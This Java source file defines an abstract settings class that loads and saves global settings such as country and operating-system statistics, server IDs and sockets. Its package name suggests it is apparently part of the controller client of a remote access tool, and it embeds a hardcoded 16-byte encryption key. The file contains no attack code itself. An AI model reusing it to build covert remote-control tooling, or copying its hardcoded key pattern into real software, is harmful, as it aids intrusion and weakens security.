package se.jrat.client.settings;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public abstract class AbstractSettings {

	private static final List<AbstractSettings> globalSettings = new ArrayList<AbstractSettings>();
	
	public static final byte[] GLOBAL_KEY = new byte[] { 16, -127, 115, 15 , 127, -15, 17, 67, -67, 44, -13, -64, -44, -43, -13, -77};

	public static void loadAllGlobals() {
		if (globalSettings.size() == 0) {
			globalSettings.add(CountryStatistics.getGlobal());
			globalSettings.add(OperatingSystemStatistics.getGlobal());
			globalSettings.add(ServerID.getGlobal());
			globalSettings.add(Sockets.getGlobal());
			globalSettings.add(FileBookmarks.getGlobal());
			globalSettings.add(Colors.getGlobal());
		}

		for (AbstractSettings setting : globalSettings) {
			try {
				setting.load();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public static void saveAllGlobals() {
		for (AbstractSettings setting : globalSettings) {
			try {
				setting.save();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public abstract void save() throws Exception;

	public abstract void load() throws Exception;

	public abstract File getFile();

}
